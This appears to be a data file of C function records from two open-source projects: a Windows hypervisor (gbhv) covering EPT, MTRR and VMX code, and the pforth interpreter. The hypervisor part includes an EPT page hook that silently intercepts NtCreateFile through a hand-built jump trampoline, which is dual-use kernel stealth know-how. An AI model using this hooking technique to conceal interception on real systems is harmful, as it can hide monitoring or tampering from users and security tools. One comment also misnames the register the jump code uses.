{"docstring": "/**\n * Initializes any EPT components that are not local to a particular processor.\n * \n * Checks to ensure EPT is supported by the processor and builds a map of system memory from\n * the MTRR registers.\n */\n", "func_signal": "BOOL HvEptGlobalInitialize(PVMM_CONTEXT GlobalContext)", "code": "{\n\t/* Ensure our processor supports all the EPT features we want to use */\n\tif (!HvEptCheckFeatures())\n\t{\n\t\tHvUtilLogError(\"Processor does not support all necessary EPT features.\\n\");\n\t\treturn FALSE;\n\t}\n\n\t/* Build a map of the system memory as exposed by the BIOS */\n\tif(!HvEptBuildMTRRMap(GlobalContext))\n\t{\n\t\tHvUtilLogError(\"Could not build MTRR memory map.\\n\");\n\t\treturn FALSE;\n\t}\n\n\treturn TRUE;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/**\n * Checks to ensure that the processor supports all EPT features that we want to use.\n */\n", "func_signal": "BOOL HvEptCheckFeatures()", "code": "{\n\tIA32_VMX_EPT_VPID_CAP_REGISTER VpidRegister;\n\tIA32_MTRR_DEF_TYPE_REGISTER MTRRDefType;\n\n\tVpidRegister.Flags = ArchGetHostMSR(IA32_VMX_EPT_VPID_CAP);\n\tMTRRDefType.Flags = ArchGetHostMSR(IA32_MTRR_DEF_TYPE);\n\n\tif (!VpidRegister.PageWalkLength4 || !VpidRegister.MemoryTypeWriteBack || !VpidRegister.Pde2MbPages)\n\t{\n\t\treturn FALSE;\n\t}\n\n\tif (!VpidRegister.AdvancedVmexitEptViolationsInformation)\n\t{\n\t\tHvUtilLogDebug(\"Processor does not support AdvancedVmexitEptViolationsInformation!\\n\");\n\t}\n\n\tif (!MTRRDefType.MtrrEnable)\n\t{\n\t\tHvUtilLogError(\"MTRR Dynamic Ranges not supported.\\n\");\n\t\treturn FALSE;\n\t}\n\n\tHvUtilLogSuccess(\"HvEptCheckFeatures: All EPT features present.\\n\");\n\treturn TRUE;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/*\n * Print an error to the kernel debugger with a format.\n */\n", "func_signal": "VOID HvUtilLogError(LPCSTR MessageFormat, ...)", "code": "{\n\tva_list ArgumentList;\n\n\tva_start(ArgumentList, MessageFormat);\n\tvDbgPrintExWithPrefix(\"[!] \", DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, MessageFormat, ArgumentList);\n\tva_end(ArgumentList);\n}", "path": "gbhv/gbhv/util.c", "commit_date": "2018-10-01 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/**\n * DPC to exit VMX on all processors.\n */\n", "func_signal": "VOID NTAPI ExitRootModeOnAllProcessors(_In_ struct _KDPC *Dpc,\n\t_In_opt_ PVOID DeferredContext,\n\t_In_opt_ PVOID SystemArgument1,\n\t_In_opt_ PVOID SystemArgument2)", "code": "{\n\tSIZE_T CurrentProcessorNumber;\n\tPVMM_PROCESSOR_CONTEXT CurrentContext;\n\n\tUNREFERENCED_PARAMETER(Dpc);\n\tUNREFERENCED_PARAMETER(DeferredContext);\n\n\t// Get the current processor number we're executing this function on right now\n\tCurrentProcessorNumber = OsGetCurrentProcessorNumber();\n\n\t// Get the logical processor context that was allocated for this current processor\n\tCurrentContext = HvGetCurrentCPUContext(GlobalContext);\n\n\t// Initialize processor for VMX\n\tif (VmxExitRootMode(CurrentContext))\n\t{\n\t\tHvUtilLogDebug(\"ExitRootModeOnAllProcessors[#%i]: Exiting VMX mode.\\n\", CurrentProcessorNumber);\n\t}\n\telse\n\t{\n\t\tHvUtilLogError(\"ExitRootModeOnAllProcessors[#%i]: Failed to exit VMX mode.\\n\", CurrentProcessorNumber);\n\t}\n\n\t// These must be called for GenericDpcCall to signal other processors\n\t// SimpleVisor code shows how to do this\n\n\t// Wait for all DPCs to synchronize at this point\n\tKeSignalCallDpcSynchronize(SystemArgument2);\n\n\t// Mark the DPC as being complete\n\tKeSignalCallDpcDone(SystemArgument1);\n}", "path": "gbhv/gbhv/entry.c", "commit_date": "2020-04-02 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/*\n * Intialize fields of the exit context based on values read from the VMCS.\n */\n", "func_signal": "VOID VmxInitializeExitContext(PVMEXIT_CONTEXT ExitContext, PGPREGISTER_CONTEXT GuestRegisters)", "code": "{\n\tVMX_ERROR VmError;\n\n\tVmError = 0;\n\n\tOsZeroMemory(ExitContext, sizeof(VMEXIT_CONTEXT));\n\n\t/*\n\t * Store pointer of the guest register context on the stack to the context for later access.\n\t */\n\tExitContext->GuestContext = GuestRegisters;\n\n\t/* By default, we increment RIP unless we're handling an EPT violation. */\n\tExitContext->ShouldIncrementRIP = TRUE;\n\n\t/* By default, we continue execution. */\n\tExitContext->ShouldStopExecution = FALSE;\n\n\t// Guest RSP at the time of exit\n\tVmxVmreadFieldToImmediate(VMCS_GUEST_RSP, &ExitContext->GuestContext->GuestRSP);\n\n\t// Guest RIP at the time of exit\n\tVmxVmreadFieldToImmediate(VMCS_GUEST_RIP, &ExitContext->GuestRIP);\n\n\t// Guest RFLAGS at the time of exit\n\tVmxVmreadFieldToImmediate(VMCS_GUEST_RFLAGS, &ExitContext->GuestFlags.RFLAGS);\n\n\t// The type of exit\n\tVmxVmreadFieldToRegister(VMCS_EXIT_REASON, &ExitContext->ExitReason);\n\n\t// Additional information about specific types of exits\n\tVmxVmreadFieldToImmediate(VMCS_EXIT_QUALIFICATION, &ExitContext->ExitQualification);\n\n\t// Length of the exiting instruction\n\tVmxVmreadFieldToImmediate(VMCS_VMEXIT_INSTRUCTION_LENGTH, &ExitContext->InstructionLength);\n\n\t// Information about the faulting instruction\n\tVmxVmreadFieldToImmediate(VMCS_VMEXIT_INSTRUCTION_INFO, &ExitContext->InstructionInformation);\n\n\t// Guest physical address during EPT exits\n\tVmxVmreadFieldToImmediate(VMCS_GUEST_PHYSICAL_ADDRESS, &ExitContext->GuestPhysicalAddress);\n}", "path": "gbhv/gbhv/exit.c", "commit_date": "2020-04-02 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/*\n * Free memory allocated by EPT functions.\n */\n", "func_signal": "VOID HvEptFreeLogicalProcessorContext(PVMM_PROCESSOR_CONTEXT ProcessorContext)", "code": "{\n\tif (ProcessorContext->EptPageTable)\n\t{\n\t\t/* No races because we are above DPC IRQL */\n\n\t\t/* Free each split */\n\t\tFOR_EACH_LIST_ENTRY(ProcessorContext->EptPageTable, DynamicSplitList, VMM_EPT_DYNAMIC_SPLIT, Split)\n\t\t\tOsFreeNonpagedMemory(Split);\n\t\tFOR_EACH_LIST_ENTRY_END();\n\n\t\t/* Free each page hook */\n\t\tFOR_EACH_LIST_ENTRY(ProcessorContext->EptPageTable, PageHookList, VMM_EPT_PAGE_HOOK, Hook)\n\t\t\tOsFreeNonpagedMemory(Hook->Trampoline);\n\t\t\tOsFreeNonpagedMemory(Hook);\n\t\tFOR_EACH_LIST_ENTRY_END();\n\n\t\t/* Free the actual page table */\n\t\tOsFreeContiguousAlignedPages(ProcessorContext->EptPageTable);\n\t}\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/*\n * Creates a 2MB identity mapped PML2 entry with a cacheability type specified by system MTRRs.\n * \n * We must ensure that we map each 2MB entry with the correct cacheability type for performance. \n * Unfortunately, the smallest paging structure is 4096 bytes so we have to mark the whole 2MB region as the least prohibitive cache type. \n * In real systems, this not much of a problem, as there are just never single pages marked with certain cacheability attributes except for the first 1MB.\n */\n", "func_signal": "VOID HvEptSetupPML2Entry(PVMM_CONTEXT GlobalContext, PEPT_PML2_ENTRY NewEntry, SIZE_T PageFrameNumber)", "code": "{\n\tSIZE_T AddressOfPage;\n\tSIZE_T CurrentMtrrRange;\n\tSIZE_T TargetMemoryType;\n\n\t/*\n\t * Each of the 512 collections of 512 PML2 entries is setup here.\n\t * This will, in total, identity map every physical address from 0x0 to physical address 0x8000000000 (512GB of memory)\n\t *\n\t * ((EntryGroupIndex * VMM_EPT_PML2E_COUNT) + EntryIndex) * 2MB is the actual physical address we're mapping\n\t */\n\tNewEntry->PageFrameNumber = PageFrameNumber;\n\n\t/* Size of 2MB page * PageFrameNumber == AddressOfPage (physical memory). */\n\tAddressOfPage = PageFrameNumber * SIZE_2_MB;\n\n    /* To be safe, we will map the first page as UC as to not bring up any kind of undefined behavior from the \n     * fixed MTRR section which we are not formally recognizing (typically there is MMIO memory in the first MB).\n\t *\n\t * I suggest reading up on the fixed MTRR section of the manual to see why the first entry is likely going to need to be UC.\n\t */\n\tif(PageFrameNumber == 0)\n\t{\n\t\tNewEntry->MemoryType = MEMORY_TYPE_UNCACHEABLE;\n\t\treturn;\n\t}\n\n\t/* Default memory type is always WB for performance. */\n\tTargetMemoryType = MEMORY_TYPE_WRITE_BACK;\n\n\t/* For each MTRR range */\n\tfor(CurrentMtrrRange = 0; CurrentMtrrRange < GlobalContext->NumberOfEnabledMemoryRanges; CurrentMtrrRange++)\n\t{\n\t\t/* If this page's address is below or equal to the max physical address of the range */\n\t\tif(AddressOfPage <= GlobalContext->MemoryRanges[CurrentMtrrRange].PhysicalEndAddress)\n\t\t{\n\t\t\t/* And this page's last address is above or equal to the base physical address of the range */\n\t\t\tif( (AddressOfPage + SIZE_2_MB - 1) >= GlobalContext->MemoryRanges[CurrentMtrrRange].PhysicalBaseAddress )\n\t\t\t{\n\t\t\t\t/* If we're here, this page fell within one of the ranges specified by the variable MTRRs\n\t\t\t\t * Therefore, we must mark this page as the same cache type exposed by the MTRR \n\t\t\t\t */\n\t\t\t\tTargetMemoryType = GlobalContext->MemoryRanges[CurrentMtrrRange].MemoryType;\n\t\t\t\t//HvUtilLogDebug(\"0x%X> Range=%llX -> %llX | Begin=%llX End=%llX\", PageFrameNumber, AddressOfPage, AddressOfPage + SIZE_2_MB - 1, GlobalContext->MemoryRanges[CurrentMtrrRange].PhysicalBaseAddress, GlobalContext->MemoryRanges[CurrentMtrrRange].PhysicalEndAddress);\n\n\t\t\t\t/* 11.11.4.1 MTRR Precedences */\n\t\t\t\tif(TargetMemoryType == MEMORY_TYPE_UNCACHEABLE)\n\t\t\t\t{\n\t\t\t\t\t/* If this is going to be marked uncacheable, then we stop the search as UC always takes precedent. */\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\t/* Finally, commit the memory type to the entry. */\n\tNewEntry->MemoryType = TargetMemoryType;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/**\n * Uses the Memory Type Range Register MSRs to build a map of the physical memory on the system.\n * This will be used to build an identity mapped EPT PML4 table which directly maps physical memory\n * of the guest to the system physical memory map containing the same memory type ranges.\n */\n", "func_signal": "BOOL HvEptBuildMTRRMap(PVMM_CONTEXT GlobalContext)", "code": "{\n\tIA32_MTRR_CAPABILITIES_REGISTER MTRRCap;\n\tIA32_MTRR_PHYSBASE_REGISTER CurrentPhysBase;\n\tIA32_MTRR_PHYSMASK_REGISTER CurrentPhysMask;\n\tPMTRR_RANGE_DESCRIPTOR Descriptor;\n\tULONG CurrentRegister;\n\tULONG NumberOfBitsInMask;\n\n\n\tMTRRCap.Flags = ArchGetHostMSR(IA32_MTRR_CAPABILITIES);\n\n\tHvUtilLogDebug(\"EPT: Number of dynamic ranges: %d\\n\", MTRRCap.VariableRangeCount);\n\n\tfor(CurrentRegister = 0; CurrentRegister < MTRRCap.VariableRangeCount; CurrentRegister++)\n\t{\n\t\t// For each dynamic register pair\n\t\tCurrentPhysBase.Flags = ArchGetHostMSR(IA32_MTRR_PHYSBASE0 + (CurrentRegister * 2));\n\t\tCurrentPhysMask.Flags = ArchGetHostMSR(IA32_MTRR_PHYSMASK0 + (CurrentRegister * 2));\n\t\n\t\t// Is the range enabled?\n\t\tif(CurrentPhysMask.Valid)\n\t\t{\n\t\t\t// We only need to read these once because the ISA dictates that MTRRs are to be synchronized between all processors\n\t\t\t// during BIOS initialization.\n\t\t\tDescriptor = &GlobalContext->MemoryRanges[GlobalContext->NumberOfEnabledMemoryRanges++];\n\n\t\t\t// Calculate the base address in bytes\n\t\t\tDescriptor->PhysicalBaseAddress = CurrentPhysBase.PageFrameNumber * PAGE_SIZE;\n\n\t\t\t// Calculate the total size of the range\n\t\t\t// The lowest bit of the mask that is set to 1 specifies the size of the range\n\t\t\t_BitScanForward64(&NumberOfBitsInMask, CurrentPhysMask.PageFrameNumber * PAGE_SIZE);\n\n\t\t\t// Size of the range in bytes + Base Address\n\t\t\tDescriptor->PhysicalEndAddress = Descriptor->PhysicalBaseAddress + ((1ULL << NumberOfBitsInMask) - 1ULL);\n\n\t\t\t// Memory Type (cacheability attributes)\n\t\t\tDescriptor->MemoryType = (UCHAR) CurrentPhysBase.Type;\n\n\t\t\tif(Descriptor->MemoryType == MEMORY_TYPE_WRITE_BACK)\n\t\t\t{\n\t\t\t\t/* This is already our default, so no need to store this range. \n\t\t\t\t * Simply 'free' the range we just wrote. */\n\t\t\t\tGlobalContext->NumberOfEnabledMemoryRanges--;\n\t\t\t}\n\t\t\tHvUtilLogDebug(\"MTRR Range: Base=0x%llX End=0x%llX Type=0x%X\\n\", Descriptor->PhysicalBaseAddress, Descriptor->PhysicalEndAddress, Descriptor->MemoryType);\n\t\t}\n\t}\n\n\tHvUtilLogDebug(\"Total MTRR Ranges Committed: %d\\n\", GlobalContext->NumberOfEnabledMemoryRanges);\n\n\treturn TRUE;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/**\n * Initialize EPT for an individual logical processor.\n * \n * Creates an identity mapped page table and sets up an EPTP to be applied to the VMCS later.\n */\n", "func_signal": "BOOL HvEptLogicalProcessorInitialize(PVMM_PROCESSOR_CONTEXT ProcessorContext)", "code": "{\n\tPVMM_EPT_PAGE_TABLE PageTable;\n\tEPT_POINTER EPTP;\n\n\t/* Allocate the identity mapped page table*/\n\tPageTable = HvEptAllocateAndCreateIdentityPageTable(ProcessorContext->GlobalContext);\n\tif (PageTable == NULL)\n\t{\n\t\tHvUtilLogError(\"Unable to allocate memory for EPT!\\n\");\n\t\treturn FALSE;\n\t}\n\n\t/* Virtual address to the page table to keep track of it for later freeing */\n\tProcessorContext->EptPageTable = PageTable;\n\n\tEPTP.Flags = 0;\n\n\t/* For performance, we let the processor know it can cache the EPT. */\n\tEPTP.MemoryType = MEMORY_TYPE_WRITE_BACK;\n\n\t/* We are not utilizing the 'access' and 'dirty' flag features. */\n\tEPTP.EnableAccessAndDirtyFlags = FALSE;\n\n\t/* \n\t * Bits 5:3 (1 less than the EPT page-walk length) must be 3, indicating an EPT page-walk length of 4; \n\t * see Section 28.2.2 \n\t */\n\tEPTP.PageWalkLength = 3;\n\n\t/* The physical page number of the page table we will be using */\n\tEPTP.PageFrameNumber = (SIZE_T)OsVirtualToPhysical(&PageTable->PML4) / PAGE_SIZE;\n\n\t/* We will write the EPTP to the VMCS later */\n\tProcessorContext->EptPointer.Flags = EPTP.Flags;\n\n\t/*\n\t * On each logical processor, create an EPT hook on NtCreateFile to intercept the system call.\n\t */\n\tif (!HvEptAddPageHook(ProcessorContext, (PVOID)NtCreateFile, (PVOID)NtCreateFileHook, (PVOID*)&NtCreateFileOrig))\n\t{\n\t\tHvUtilLogError(\"Failed to build page hook for NtCreateFile\");\n\t\tHvEptFreeLogicalProcessorContext(ProcessorContext);\n\t\treturn FALSE;\n\t}\n\n\treturn TRUE;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/**\n * Split a large 2MB page into 512 smaller 4096 pages.\n * \n * In order to set discrete EPT permissions on a singular 4096 byte page, we need to split our\n * default 2MB entries into 512 smaller 4096 byte entries. This function will replace the default\n * 2MB entry created for the page table at the specified PhysicalAddress and replace it with a 2MB\n * pointer entry. That pointer will point to a dynamically allocated set of 512 smaller 4096 byte\n * pages, which will become the new permission structures for that 2MB region.\n */\n", "func_signal": "BOOL HvEptSplitLargePage(PVMM_PROCESSOR_CONTEXT ProcessorContext, SIZE_T PhysicalAddress)", "code": "{\n\tPVMM_EPT_DYNAMIC_SPLIT NewSplit;\n\tEPT_PML1_ENTRY EntryTemplate;\n\tSIZE_T EntryIndex;\n\tPEPT_PML2_ENTRY TargetEntry;\n\tEPT_PML2_POINTER NewPointer;\n\n\tHvUtilLog(\"Splitting large page @ PA:%p\", PhysicalAddress);\n\n\t/* Find the PML2 entry that's currently used*/\n\tTargetEntry = HvEptGetPml2Entry(ProcessorContext, PhysicalAddress);\n\tif(!TargetEntry)\n\t{\n\t\tHvUtilLogError(\"HvEptSplitLargePage: Invalid physical address.\\n\");\n\t\treturn FALSE;\n\t}\n\n\t/* If this large page is not marked a large page, that means it's a pointer already.\n\t * That page is therefore already split.\n\t */\n\tif(!TargetEntry->LargePage)\n\t{\n\t\treturn TRUE;\n\t}\n\n\t/*\n\t* Allocate the PML1 entries for the split.\n\t* NOTE: This would *not* need to use contiguous aligned pages normally, except for a bug which is experienced\n\t* in Windows 10 v2004 where changes to the nonpaged pool allocator resulted in some page aligned allocations\n\t* being mapped as 4MB large pages rather than the expected 4KB pages. This causes the following VtoP and PtoV\n\t* functions to fail, because the Mm APIs are not able to properly translate physical addresses within a large page\n\t* back to its virtual address due to a null PTE pointer inside the PFN database entry for the large page.\n\t* \n\t* From my testing, I was unable to find a way to coerce Mm to split a nonpaged pool large page for me, so the best\n\t* alternative was to use the contiguous aligned pages allocator because, in my testing, it resulted in only 4KB virtual\n\t* allocations. This allocator also utilizes nonpaged pool frames, so it is more-or-less the same as the other allocator.\n\t*/\n\tNewSplit = (PVMM_EPT_DYNAMIC_SPLIT) OsAllocateContiguousAlignedPages(sizeof(VMM_EPT_DYNAMIC_SPLIT)/PAGE_SIZE);\n\tif(!NewSplit)\n\t{\n\t\tHvUtilLogError(\"HvEptSplitLargePage: Failed to allocate dynamic split memory.\\n\");\n\t\treturn FALSE;\n\t}\n\n\t/*\n\t * Point back to the entry in the dynamic split for easy reference for which entry that\n\t * dynamic split is for.\n\t */\n\tNewSplit->Entry = TargetEntry;\n\n\t/* Make a template for RWX */\n\tEntryTemplate.Flags = 0;\n\tEntryTemplate.ReadAccess = 1;\n\tEntryTemplate.WriteAccess = 1;\n\tEntryTemplate.ExecuteAccess = 1;\n\tEntryTemplate.MemoryType = TargetEntry->MemoryType;\n\tEntryTemplate.IgnorePat = TargetEntry->IgnorePat;\n\tEntryTemplate.SuppressVe = TargetEntry->SuppressVe;\n\n\t/* Copy the template into all the PML1 entries */\n\t__stosq((SIZE_T*)&NewSplit->PML1[0], EntryTemplate.Flags, VMM_EPT_PML1E_COUNT);\n\n\t/**\n\t * Set the page frame numbers for identity mapping.\n\t */\n\tfor(EntryIndex = 0; EntryIndex < VMM_EPT_PML1E_COUNT; EntryIndex++)\n\t{\n\t\t/* Convert the 2MB page frame number to the 4096 page entry number plus the offset into the frame. */\n\t\tNewSplit->PML1[EntryIndex].PageFrameNumber = ( (TargetEntry->PageFrameNumber * SIZE_2_MB) / PAGE_SIZE ) + EntryIndex;\n\t}\n\n\t/* Allocate a new pointer which will replace the 2MB entry with a pointer to 512 4096 byte entries. */\n\tNewPointer.Flags = 0;\n\tNewPointer.WriteAccess = 1;\n\tNewPointer.ReadAccess = 1;\n\tNewPointer.ExecuteAccess = 1;\n\n\t/*\n\t* Create an EPT pointer to the new PML2 entry we just created\n\t*/\n\tNewPointer.PageFrameNumber = (SIZE_T)OsVirtualToPhysical(&NewSplit->PML1[0]) / PAGE_SIZE;\n\n\t/* Add our allocation to the linked list of dynamic splits for later deallocation */\n\tInsertHeadList(&ProcessorContext->EptPageTable->DynamicSplitList, &NewSplit->DynamicSplitList);\n\n\t/**\n\t * Now, replace the entry in the page table with our new split pointer.\n\t */\n\tRtlCopyMemory(TargetEntry, &NewPointer, sizeof(NewPointer));\n\n\treturn TRUE;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/*\n * Print a success message to the kernel debugger.\n */\n", "func_signal": "VOID HvUtilLogSuccess(LPCSTR MessageFormat, ...)", "code": "{\n\tva_list ArgumentList;\n\n\tva_start(ArgumentList, MessageFormat);\n\tvDbgPrintExWithPrefix(\"[+] \", DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, MessageFormat, ArgumentList);\n\tva_end(ArgumentList);\n}", "path": "gbhv/gbhv/util.c", "commit_date": "2018-10-01 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/* Write an absolute x64 jump to an arbitrary address to a buffer. */\n", "func_signal": "VOID HvEptHookWriteAbsoluteJump(PCHAR TargetBuffer, SIZE_T TargetAddress)", "code": "{\n\t/* mov r15, Target */\n\tTargetBuffer[0] = 0x49;\n\tTargetBuffer[1] = 0xBB;\n\n\t/* Target */\n\t*((PSIZE_T)&TargetBuffer[2]) = TargetAddress;\n\n\t/* push r15 */\n\tTargetBuffer[10] = 0x41;\n\tTargetBuffer[11] = 0x53;\n\n\t/* ret */\n\tTargetBuffer[12] = 0xC3;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/*\n * Print a message to the kernel debugger.\n */\n", "func_signal": "VOID HvUtilLog(LPCSTR MessageFormat, ...)", "code": "{\n\tva_list ArgumentList;\n\n\tva_start(ArgumentList, MessageFormat);\n\tvDbgPrintExWithPrefix(\"[*] \", DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, MessageFormat, ArgumentList);\n\tva_end(ArgumentList);\n}", "path": "gbhv/gbhv/util.c", "commit_date": "2018-10-01 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/* Needed cuz _getch() does not echo. */\n", "func_signal": "int  sdTerminalEcho( char c )", "code": "{\n    sdConsoleEmit((char)(c));\n    return 0;\n}", "path": "pforth/csrc/win32_console/pf_io_win32_console.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/******************************************************************/\n/* Use console mode I/O so that KEY and ?TERMINAL will work.\n * Parse ANSI escape sequences and call the appropriate cursor\n * control functions.\n */\n", "func_signal": "int  sdTerminalOut( char c )", "code": "{\n    switch( sConsoleState )\n    {\n    case SDCONSOLE_STATE_IDLE:\n        switch( c )\n        {\n        case ASCII_ESCAPE:\n            sConsoleState = SDCONSOLE_STATE_GOT_ESCAPE;\n            break;\n        default:\n            sdConsoleEmit( c );\n        }\n        break;\n\n    case SDCONSOLE_STATE_GOT_ESCAPE:\n        switch( c )\n        {\n        case '[':\n            sConsoleState = SDCONSOLE_STATE_GOT_BRACKET;\n            sParam1 = 0;\n            break;\n        default:\n            sConsoleState = SDCONSOLE_STATE_IDLE;\n            sdConsoleEmit( c );\n        }\n        break;\n\n    case SDCONSOLE_STATE_GOT_BRACKET:\n        if( (c >= '0') && (c <= '9') )\n        {\n            sParam1 = (sParam1 * 10) + (c - '0');\n        }\n        else\n        {\n            sConsoleState = SDCONSOLE_STATE_IDLE;\n            if( c == 'K')\n            {\n                sdEraseEOL();\n            }\n            else if( c == 'D' )\n            {\n                sdCursorBack( sParam1 );\n            }\n            else if( c == 'C' )\n            {\n                sdCursorForward( sParam1 );\n            }\n            else if( (c == 'J') && (sParam1 == 2) )\n            {\n                sdClearScreen();\n            }\n        }\n        break;\n    }\n    return 0;\n}", "path": "pforth/csrc/win32_console/pf_io_win32_console.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/***************************************************************\n** Dictionary Management\n***************************************************************/\n", "func_signal": "ThrowCode pfExecIfDefined( const char *CString )", "code": "{\n    ThrowCode result = 0;\n    if( NAME_BASE != (cell_t)NULL)\n    {\n        ExecToken  XT;\n        if( ffFindC( CString, &XT ) )\n        {\n            result = pfCatch( XT );\n        }\n    }\n    return result;\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/* Write DIFF 0 bytes to FILE. Return non-FALSE on error. */\n", "func_signal": "static bool_t ExtendFile( FileStream *File, size_t Diff )", "code": "{\n    bool_t Error = TRUE;\n    size_t BufSize = 512;\n    char * Buffer = pfAllocMem( BufSize );\n    if( Buffer != 0 )\n    {\n\tpfSetMemory( Buffer, 0, BufSize );\n\twhile( Diff > 0 )\n\t{\n\t    size_t N = MIN( Diff, BufSize );\n\t    if( fwrite( Buffer, 1, N, File ) < N ) goto cleanup;\n\t    Diff -= N;\n\t}\n\tError = FALSE;\n      cleanup:\n\tpfFreeMem( Buffer );\n    }\n    return Error;\n}", "path": "pforth/csrc/stdio/pf_fileio_stdio.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/**************************************************************\n** Copy a Forth String to a 'C' string.\n*/\n", "func_signal": "char *ForthStringToC( char *dst, const char *FString, cell_t dstSize )", "code": "{\n    cell_t Len;\n\n    Len = (cell_t) *FString;\n    /* Make sure the text + NUL can fit. */\n    if( Len >= dstSize )\n    {\n        Len = dstSize - 1;\n    }\n    pfCopyMemory( dst, FString+1, Len );\n    dst[Len] = '\\0';\n\n    return dst;\n}", "path": "pforth/csrc/pf_text.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/* Shrink the file FILE to NEWSIZE.  Return non-FALSE on error.\n *\n * There's no direct way to do this in ANSI C.  The closest thing we\n * have is freopen(3), which truncates a file to zero length if we use\n * \"w+b\" as mode argument.  So we do this:\n *\n *   1. copy original content to temporary file\n *   2. re-open and truncate FILE\n *   3. copy the temporary file to FILE\n *\n * Unfortunately, \"w+b\" may not be the same mode as the original mode\n * of FILE.  I don't see a away to avoid this, though.\n *\n * We call freopen with NULL as path argument, because we don't know\n * the actual file-name.  It seems that the trick with path=NULL is\n * not part of C89 but it's in C99.\n */\n", "func_signal": "static bool_t TruncateFile( FileStream *File, long Newsize )", "code": "{\n    bool_t Error = TRUE;\n    if( fseek( File, 0, SEEK_SET ) == 0)\n    {\n\tFileStream *TmpFile = tmpfile();\n\tif( TmpFile != NULL )\n\t{\n\t    if( CopyFile( File, TmpFile, Newsize )) goto cleanup;\n\t    if( fseek( TmpFile, 0, SEEK_SET ) != 0 ) goto cleanup;\n\t    if( freopen( NULL, \"w+b\", File ) == NULL ) goto cleanup;\n\t    if( CopyFile( TmpFile, File, Newsize )) goto cleanup;\n\t    Error = FALSE;\n\n\t  cleanup:\n\t    fclose( TmpFile );\n\t}\n    }\n    return Error;\n}", "path": "pforth/csrc/stdio/pf_fileio_stdio.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/**************************************************************\n** Compare two test strings, case sensitive.\n** Return TRUE if they match.\n*/\n", "func_signal": "cell_t ffCompareText( const char *s1, const char *s2, cell_t len )", "code": "{\n    cell_t i, Result;\n\n    Result = TRUE;\n    for( i=0; i<len; i++ )\n    {\nDBUGX((\"ffCompareText: *s1 = 0x%x, *s2 = 0x%x\\n\", *s1, *s2 ));\n        if( *s1++ != *s2++ )\n        {\n            Result = FALSE;\n            break;\n        }\n    }\nDBUGX((\"ffCompareText: return 0x%x\\n\", Result ));\n    return Result;\n}", "path": "pforth/csrc/pf_text.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/***************************************************************\n** Task Management\n***************************************************************/\n", "func_signal": "void pfDeleteTask( PForthTask task )", "code": "{\n    pfTaskData_t *cftd = (pfTaskData_t *)task;\n    FREE_VAR( cftd->td_ReturnLimit );\n    FREE_VAR( cftd->td_StackLimit );\n    pfFreeMem( cftd );\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
